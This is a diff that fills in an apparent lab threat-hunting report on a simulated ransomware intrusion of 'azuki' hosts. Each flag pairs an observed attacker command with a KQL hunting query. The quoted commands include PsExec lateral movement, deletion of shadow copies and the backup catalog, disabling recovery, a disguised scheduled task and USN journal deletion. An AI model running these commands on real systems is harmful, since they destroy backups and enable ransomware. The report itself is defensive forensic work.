@@ -650,20 +650,20 @@ DeviceProcessEvents
 
 ---
 <details>
-<summary id="-flag-x">🚩 <strong>Flag x: <Technique Name></strong></summary>
+<summary id="-flag-13">🚩 <strong>Flag 13: <Technique Name></strong></summary>
 
 ### 🎯 Objective
 <What the attacker was trying to accomplish>
 
 ### 📌 Finding
-<High-level description of the activity>
+PsExec64.exe
 
 ### 🔍 Evidence
 
 | Field | Value |
 |------|-------|
 | Host | <Placeholder> |
-| Timestamp | <Placeholder> |
+| Timestamp | 2025-11-25T06:03:47.900164Z |
 | Process | <Placeholder> |
 | Parent Process | <Placeholder> |
 | Command Line | <Placeholder> |
@@ -672,10 +672,17 @@ DeviceProcessEvents
 <Explain impact, risk, and relevance>
 
 ### 🔧 KQL Query Used
-<Add KQL here>
+DeviceProcessEvents
+| where DeviceName has "azuki"
+| where TimeGenerated between (datetime(2025-11-25T00:00:00Z)..datetime(2025-11-25T23:59:59Z))
+| where FileName endswith ".exe"
+| where ProcessCommandLine has_any ("\\\\","ADMIN$","IPC$","C$","schtasks","wmic","sc ","psexec","PSEXESVC","at.exe","/node:","process call create")
+| summarize DeviceCount=dcount(DeviceName), Devices=make_set(DeviceName) by FileName, ProcessCommandLine
+| order by DeviceCount desc
 
 ### 🖼️ Screenshot
-<Insert screenshot>
+<img width="792" height="138" alt="image" src="https://github.com/user-attachments/assets/e0f3dd10-f0b8-4fb3-8d64-b92bac00c095" />
+
 
 ### 🛠️ Detection Recommendation
 
@@ -686,20 +693,20 @@ DeviceProcessEvents
 
 ---
 <details>
-<summary id="-flag-x">🚩 <strong>Flag x: <Technique Name></strong></summary>
+<summary id="-flag-14">🚩 <strong>Flag 14: <Technique Name></strong></summary>
 
 ### 🎯 Objective
 <What the attacker was trying to accomplish>
 
 ### 📌 Finding
-<High-level description of the activity>
+"PsExec64.exe" \\10.1.0.102 -u kenji.sato -p ********** -c -f C:\Windows\Temp\cache\silentlynx.exe
 
 ### 🔍 Evidence
 
 | Field | Value |
 |------|-------|
 | Host | <Placeholder> |
-| Timestamp | <Placeholder> |
+| Timestamp | 2025-11-25T06:03:47.900164Z |
 | Process | <Placeholder> |
 | Parent Process | <Placeholder> |
 | Command Line | <Placeholder> |
@@ -708,10 +715,16 @@ DeviceProcessEvents
 <Explain impact, risk, and relevance>
 
 ### 🔧 KQL Query Used
-<Add KQL here>
+DeviceProcessEvents
+| where DeviceName has "azuki"
+| where FileName =~ "PsExec64.exe"
+| where TimeGenerated between (datetime(2025-11-25T00:00:00Z)..datetime(2025-11-25T23:59:59Z))
+| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessCommandLine
+| order by TimeGenerated asc
 
 ### 🖼️ Screenshot
-<Insert screenshot>
+<img width="1107" height="195" alt="image" src="https://github.com/user-attachments/assets/968154fc-27de-49a4-88d8-e2a0c3f69f7a" />
+
 
 ### 🛠️ Detection Recommendation
 
@@ -722,20 +735,20 @@ DeviceProcessEvents
 
 ---
 <details>
-<summary id="-flag-x">🚩 <strong>Flag x: <Technique Name></strong></summary>
+<summary id="-flag-15">🚩 <strong>Flag 15: <Technique Name></strong></summary>
 
 ### 🎯 Objective
 <What the attacker was trying to accomplish>
 
 ### 📌 Finding
-<High-level description of the activity>
+silentlynx.exe
 
 ### 🔍 Evidence
 
 | Field | Value |
 |------|-------|
 | Host | <Placeholder> |
-| Timestamp | <Placeholder> |
+| Timestamp | 2025-11-25T06:03:47.900164Z |
 | Process | <Placeholder> |
 | Parent Process | <Placeholder> |
 | Command Line | <Placeholder> |
@@ -744,10 +757,15 @@ DeviceProcessEvents
 <Explain impact, risk, and relevance>
 
 ### 🔧 KQL Query Used
-<Add KQL here>
+DeviceProcessEvents
+| where DeviceName has "azuki"
+| where FileName =~ "PsExec64.exe"
+| where TimeGenerated between (datetime(2025-11-25T00:00:00Z)..datetime(2025-11-25T23:59:59Z))
+| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessCommandLine
+| order by TimeGenerated asc
 
 ### 🖼️ Screenshot
-<Insert screenshot>
+<img width="1107" height="195" alt="image" src="https://github.com/user-attachments/assets/968154fc-27de-49a4-88d8-e2a0c3f69f7a" />
 
 ### 🛠️ Detection Recommendation
 
@@ -758,20 +776,20 @@ DeviceProcessEvents
 
 ---
 <details>
-<summary id="-flag-x">🚩 <strong>Flag x: <Technique Name></strong></summary>
+<summary id="-flag-16">🚩 <strong>Flag 16: <Technique Name></strong></summary>
 
 ### 🎯 Objective
 <What the attacker was trying to accomplish>
 
 ### 📌 Finding
-<High-level description of the activity>
+"net" stop VSS /y
 
 ### 🔍 Evidence
 
 | Field | Value |
 |------|-------|
 | Host | <Placeholder> |
-| Timestamp | <Placeholder> |
+| Timestamp | 2025-11-25T06:04:53.2550438Z |
 | Process | <Placeholder> |
 | Parent Process | <Placeholder> |
 | Command Line | <Placeholder> |
@@ -780,10 +798,17 @@ DeviceProcessEvents
 <Explain impact, risk, and relevance>
 
 ### 🔧 KQL Query Used
-<Add KQL here>
+DeviceProcessEvents
+| where DeviceName has "azuki"
+| where TimeGenerated between (datetime(2025-11-25T00:00:00Z)..datetime(2025-11-25T23:59:59Z))
+| where FileName in ("net.exe","sc.exe","services.exe")
+| where ProcessCommandLine has_any ("VSS","Shadow","Volume")
+| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
+| order by TimeGenerated asc
 
 ### 🖼️ Screenshot
-<Insert screenshot>
+<img width="927" height="167" alt="image" src="https://github.com/user-attachments/assets/630ac85f-1500-47ec-96e9-2526c9626149" />
+
 
 ### 🛠️ Detection Recommendation
 
@@ -794,20 +819,20 @@ DeviceProcessEvents
 
 ---
 <details>
-<summary id="-flag-x">🚩 <strong>Flag x: <Technique Name></strong></summary>
+<summary id="-flag-17">🚩 <strong>Flag 17: <Technique Name></strong></summary>
 
 ### 🎯 Objective
 <What the attacker was trying to accomplish>
 
 ### 📌 Finding
-<High-level description of the activity>
+"net" stop wbengine /y
 
 ### 🔍 Evidence
 
 | Field | Value |
 |------|-------|
 | Host | <Placeholder> |
-| Timestamp | <Placeholder> |
+| Timestamp | 2025-11-25T06:04:54.0244502Z |
 | Process | <Placeholder> |
 | Parent Process | <Placeholder> |
 | Command Line | <Placeholder> |
@@ -816,10 +841,17 @@ DeviceProcessEvents
 <Explain impact, risk, and relevance>
 
 ### 🔧 KQL Query Used
-<Add KQL here>
+DeviceProcessEvents
+| where DeviceName has "azuki"
+| where TimeGenerated between (datetime(2025-11-25T00:00:00Z)..datetime(2025-11-25T23:59:59Z))
+| where FileName in ("net.exe","sc.exe","services.exe")
+| where ProcessCommandLine has "wbengine"
+| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
+| order by TimeGenerated asc
 
 ### 🖼️ Screenshot
-<Insert screenshot>
+<img width="985" height="166" alt="image" src="https://github.com/user-attachments/assets/2b180578-483e-4749-a57a-eebf14d28580" />
+
 
 ### 🛠️ Detection Recommendation
 
@@ -830,20 +862,20 @@ DeviceProcessEvents
 
 ---
 <details>
-<summary id="-flag-x">🚩 <strong>Flag x: <Technique Name></strong></summary>
+<summary id="-flag-18">🚩 <strong>Flag 18: <Technique Name></strong></summary>
 
 ### 🎯 Objective
 <What the attacker was trying to accomplish>
 
 ### 📌 Finding
-<High-level description of the activity>
+taskkill /F /IM sqlservr.exe
 
 ### 🔍 Evidence
 
 | Field | Value |
 |------|-------|
 | Host | <Placeholder> |
-| Timestamp | <Placeholder> |
+| Timestamp | 2025-11-25T06:07:07.0199729Z |
 | Process | <Placeholder> |
 | Parent Process | <Placeholder> |
 | Command Line | <Placeholder> |
@@ -852,10 +884,16 @@ DeviceProcessEvents
 <Explain impact, risk, and relevance>
 
 ### 🔧 KQL Query Used
-<Add KQL here>
+DeviceProcessEvents
+| where DeviceName has "azuki"
+| where TimeGenerated between (datetime(2025-11-25T05:55:00Z)..datetime(2025-11-25T06:10:00Z))
+| where FileName == "taskkill.exe"
+| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine
+| order by TimeGenerated asc
 
 ### 🖼️ Screenshot
-<Insert screenshot>
+<img width="949" height="133" alt="image" src="https://github.com/user-attachments/assets/70dcd8e3-4568-4660-a558-bd6f9ba3999b" />
+
 
 ### 🛠️ Detection Recommendation
 
@@ -866,20 +904,21 @@ DeviceProcessEvents
 
 ---
 <details>
-<summary id="-flag-x">🚩 <strong>Flag x: <Technique Name></strong></summary>
+<summary id="-flag-19">🚩 <strong>Flag 19: <Technique Name></strong></summary>
 
 ### 🎯 Objective
 <What the attacker was trying to accomplish>
 
 ### 📌 Finding
-<High-level description of the activity>
+
+"vssadmin" delete shadows /all /quiet
 
 ### 🔍 Evidence
 
 | Field | Value |
 |------|-------|
 | Host | <Placeholder> |
-| Timestamp | <Placeholder> |
+| Timestamp | 2025-11-25T06:07:08.2198577Z |
 | Process | <Placeholder> |
 | Parent Process | <Placeholder> |
 | Command Line | <Placeholder> |
@@ -888,10 +927,16 @@ DeviceProcessEvents
 <Explain impact, risk, and relevance>
 
 ### 🔧 KQL Query Used
-<Add KQL here>
+DeviceProcessEvents
+| where DeviceName has "azuki"
+| where TimeGenerated between (datetime(2025-11-25T00:00:00Z)..datetime(2025-11-25T23:59:59Z))
+| where ProcessCommandLine has_any ("vssadmin","shadowcopy","wmic","net stop","sc stop","diskshadow","wbadmin","bcdedit","reagentc")
+| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
+| order by TimeGenerated asc
 
 ### 🖼️ Screenshot
-<Insert screenshot>
+<img width="1053" height="167" alt="image" src="https://github.com/user-attachments/assets/1acf40a9-75c8-4097-9c59-c413c140ae90" />
+
 
 ### 🛠️ Detection Recommendation
 
@@ -902,7 +947,7 @@ DeviceProcessEvents
 
 ---
 <details>
-<summary id="-flag-x">🚩 <strong>Flag x: <Technique Name></strong></summary>
+<summary id="-flag-20">🚩 <strong>Flag 20: <Technique Name></strong></summary>
 
 ### 🎯 Objective
 <What the attacker was trying to accomplish>
@@ -914,8 +959,8 @@ DeviceProcessEvents
 
 | Field | Value |
 |------|-------|
-| Host | <Placeholder> |
-| Timestamp | <Placeholder> |
+| Host | azuki-adminpc, azuki-sl |
+| Timestamp | 2025-11-25T06:05:00.8701626Z |
 | Process | <Placeholder> |
 | Parent Process | <Placeholder> |
 | Command Line | <Placeholder> |
@@ -924,10 +969,17 @@ DeviceProcessEvents
 <Explain impact, risk, and relevance>
 
 ### 🔧 KQL Query Used
-<Add KQL here>
+DeviceProcessEvents
+| where DeviceName has "azuki"
+| where TimeGenerated between (datetime(2025-11-25T00:00:00Z)..datetime(2025-11-25T23:59:59Z))
+| where ProcessCommandLine has_any ("vssadmin","shadowcopy","wmic","net stop","sc stop","diskshadow","wbadmin","bcdedit","reagentc")
+| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
+| order by TimeGenerated asc
+
 
 ### 🖼️ Screenshot
-<Insert screenshot>
+<img width="676" height="157" alt="image" src="https://github.com/user-attachments/assets/69c9de16-3060-490e-8ba5-00281e2125d5" />
+
 
 ### 🛠️ Detection Recommendation
 
@@ -938,20 +990,20 @@ DeviceProcessEvents
 
 ---
 <details>
-<summary id="-flag-x">🚩 <strong>Flag x: <Technique Name></strong></summary>
+<summary id="-flag-21">🚩 <strong>Flag 21: <Technique Name></strong></summary>
 
 ### 🎯 Objective
 <What the attacker was trying to accomplish>
 
 ### 📌 Finding
-<High-level description of the activity>
+"bcdedit" /set {default} recoveryenabled No
 
 ### 🔍 Evidence
 
 | Field | Value |
 |------|-------|
-| Host | <Placeholder> |
-| Timestamp | <Placeholder> |
+| Host | azuki-adminpc, azuki-sl  |
+| Timestamp | 2025-11-25T06:04:59.5579336Z |
 | Process | <Placeholder> |
 | Parent Process | <Placeholder> |
 | Command Line | <Placeholder> |
@@ -960,10 +1012,17 @@ DeviceProcessEvents
 <Explain impact, risk, and relevance>
 
 ### 🔧 KQL Query Used
-<Add KQL here>
+DeviceProcessEvents
+| where DeviceName has "azuki"
+| where TimeGenerated between (datetime(2025-11-25T00:00:00Z)..datetime(2025-11-25T23:59:59Z))
+| where FileName == "bcdedit.exe"
+| where ProcessCommandLine has "recoveryenabled"
+| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine
+| order by TimeGenerated asc
 
 ### 🖼️ Screenshot
-<Insert screenshot>
+<img width="541" height="131" alt="image" src="https://github.com/user-attachments/assets/d369ed75-b945-4297-9a09-d56276754ff1" />
+
 
 ### 🛠️ Detection Recommendation
 
@@ -974,20 +1033,21 @@ DeviceProcessEvents
 
 ---
 <details>
-<summary id="-flag-x">🚩 <strong>Flag x: <Technique Name></strong></summary>
+<summary id="-flag-22">🚩 <strong>Flag 22: <Technique Name></strong></summary>
 
 ### 🎯 Objective
 <What the attacker was trying to accomplish>
 
 ### 📌 Finding
-<High-level description of the activity>
+
+"wbadmin" delete catalog -quiet
 
 ### 🔍 Evidence
 
 | Field | Value |
 |------|-------|
 | Host | <Placeholder> |
-| Timestamp | <Placeholder> |
+| Timestamp | 2025-11-25T06:04:59.7181241Z |
 | Process | <Placeholder> |
 | Parent Process | <Placeholder> |
 | Command Line | <Placeholder> |
@@ -996,10 +1056,17 @@ DeviceProcessEvents
 <Explain impact, risk, and relevance>
 
 ### 🔧 KQL Query Used
-<Add KQL here>
+DeviceProcessEvents
+| where DeviceName has "azuki"
+| where TimeGenerated between (datetime(2025-11-25T00:00:00Z)..datetime(2025-11-25T23:59:59Z))
+| where FileName == "wbadmin.exe"
+| where ProcessCommandLine has "delete catalog"
+| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine
+| order by TimeGenerated asc
 
 ### 🖼️ Screenshot
-<Insert screenshot>
+<img width="502" height="135" alt="image" src="https://github.com/user-attachments/assets/5f530429-4271-42fa-92bb-ae06f18a772f" />
+
 
 ### 🛠️ Detection Recommendation
 
@@ -1010,20 +1077,21 @@ DeviceProcessEvents
 
 ---
 <details>
-<summary id="-flag-x">🚩 <strong>Flag x: <Technique Name></strong></summary>
+<summary id="-flag-23">🚩 <strong>Flag 23: <Technique Name></strong></summary>
 
 ### 🎯 Objective
 <What the attacker was trying to accomplish>
 
 ### 📌 Finding
-<High-level description of the activity>
+
+WindowsSecurityHealth
 
 ### 🔍 Evidence
 
 | Field | Value |
 |------|-------|
 | Host | <Placeholder> |
-| Timestamp | <Placeholder> |
+| Timestamp | 2025-11-25T06:05:01.1151868Z |
 | Process | <Placeholder> |
 | Parent Process | <Placeholder> |
 | Command Line | <Placeholder> |
@@ -1032,10 +1100,16 @@ DeviceProcessEvents
 <Explain impact, risk, and relevance>
 
 ### 🔧 KQL Query Used
-<Add KQL here>
+DeviceRegistryEvents
+| where DeviceName has "azuki"
+| where TimeGenerated between (datetime(2025-11-25T00:00:00Z)..datetime(2025-11-25T23:59:59Z))
+| where RegistryKey has @"\Run"
+| project TimeGenerated, DeviceName, RegistryValueName, RegistryValueData
+| order by TimeGenerated asc
 
 ### 🖼️ Screenshot
-<Insert screenshot>
+<img width="847" height="133" alt="image" src="https://github.com/user-attachments/assets/788bde3c-f283-4af0-bb55-c9fc7bd6f46e" />
+
 
 ### 🛠️ Detection Recommendation
 
@@ -1046,20 +1120,20 @@ DeviceProcessEvents
 
 ---
 <details>
-<summary id="-flag-x">🚩 <strong>Flag x: <Technique Name></strong></summary>
+<summary id="-flag-24">🚩 <strong>Flag 24: <Technique Name></strong></summary>
 
 ### 🎯 Objective
 <What the attacker was trying to accomplish>
 
 ### 📌 Finding
-<High-level description of the activity>
+"schtasks" /create /tn "Microsoft\Windows\Security\SecurityHealthService" /tr "C:\Windows\Temp\cache\silentlynx.exe" /sc onlogon /rl highest /f
 
 ### 🔍 Evidence
 
 | Field | Value |
 |------|-------|
 | Host | <Placeholder> |
-| Timestamp | <Placeholder> |
+| Timestamp | 2025-11-25T06:05:01.1297501Z |
 | Process | <Placeholder> |
 | Parent Process | <Placeholder> |
 | Command Line | <Placeholder> |
@@ -1068,10 +1142,15 @@ DeviceProcessEvents
 <Explain impact, risk, and relevance>
 
 ### 🔧 KQL Query Used
-<Add KQL here>
+DeviceProcessEvents
+| where DeviceName has "azuki"
+| where TimeGenerated between (datetime(2025-11-25T00:00:00Z)..datetime(2025-11-25T23:59:59Z))
+| where ProcessCommandLine has @"Microsoft\Windows\Security\SecurityHealthService"
+| project TimeGenerated, DeviceName, ProcessCommandLine
 
 ### 🖼️ Screenshot
-<Insert screenshot>
+<img width="1194" height="99" alt="image" src="https://github.com/user-attachments/assets/5a2691a1-e32b-43eb-80d4-e8ade0e7c95c" />
+
 
 ### 🛠️ Detection Recommendation
 
@@ -1082,20 +1161,20 @@ DeviceProcessEvents
 
 ---
 <details>
-<summary id="-flag-x">🚩 <strong>Flag x: <Technique Name></strong></summary>
+<summary id="-flag-25">🚩 <strong>Flag 25: <Technique Name></strong></summary>
 
 ### 🎯 Objective
 <What the attacker was trying to accomplish>
 
 ### 📌 Finding
-<High-level description of the activity>
+"fsutil.exe" usn deletejournal /D C:
 
 ### 🔍 Evidence
 
 | Field | Value |
 |------|-------|
 | Host | <Placeholder> |
-| Timestamp | <Placeholder> |
+| Timestamp | 2025-11-25T06:10:04.9145097Z |
 | Process | <Placeholder> |
 | Parent Process | <Placeholder> |
 | Command Line | <Placeholder> |
@@ -1104,10 +1183,17 @@ DeviceProcessEvents
 <Explain impact, risk, and relevance>
 
 ### 🔧 KQL Query Used
-<Add KQL here>
+DeviceProcessEvents
+| where DeviceName has "azuki"
+| where TimeGenerated between (datetime(2025-11-25T00:00:00Z)..datetime(2025-11-25T23:59:59Z))
+| where FileName == "fsutil.exe"
+| where ProcessCommandLine has "deletejournal"
+| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine
+| order by TimeGenerated asc
 
 ### 🖼️ Screenshot
-<Insert screenshot>
+<img width="801" height="150" alt="image" src="https://github.com/user-attachments/assets/9c14f007-8212-4d9f-8c0d-0583bf4ace64" />
+
 
 ### 🛠️ Detection Recommendation
 
@@ -1117,6 +1203,47 @@ DeviceProcessEvents
 </details>
 
 ---
+
+<details>
+<summary id="-flag-26">🚩 <strong>Flag 26: <Technique Name></strong></summary>
+
+### 🎯 Objective
+<What the attacker was trying to accomplish>
+
+### 📌 Finding
+SILENTLYNX_README.txt
+
+### 🔍 Evidence
+
+| Field | Value |
+|------|-------|
+| Host | <Placeholder> |
+| Timestamp | 2025-11-25T06:05:01.1043756Z |
+| Process | <Placeholder> |
+| Parent Process | powershell.exe |
+| Command Line | <Placeholder> |
+
+### 💡 Why it matters
+<Explain impact, risk, and relevance>
+
+### 🔧 KQL Query Used
+DeviceFileEvents
+| where DeviceName has "azuki"
+| where TimeGenerated between (datetime(2025-11-20T00:00:00Z)..datetime(2025-12-04T23:59:59Z))
+| where FileName endswith ".txt"
+| project TimeGenerated, DeviceName, ActionType, FileName, FolderPath, InitiatingProcessFileName
+| order by TimeGenerated asc
+
+### 🖼️ Screenshot
+<img width="1538" height="279" alt="image" src="https://github.com/user-attachments/assets/14be10cd-b157-4612-bcc1-e71fde8b143f" />
+
+
+### 🛠️ Detection Recommendation
+
+**Hunting Tip:**  
+<Actionable guidance for defenders>
+
+</details>
 <!-- Duplicate Flag 1 section for Flags 2–20 -->
 
 ---
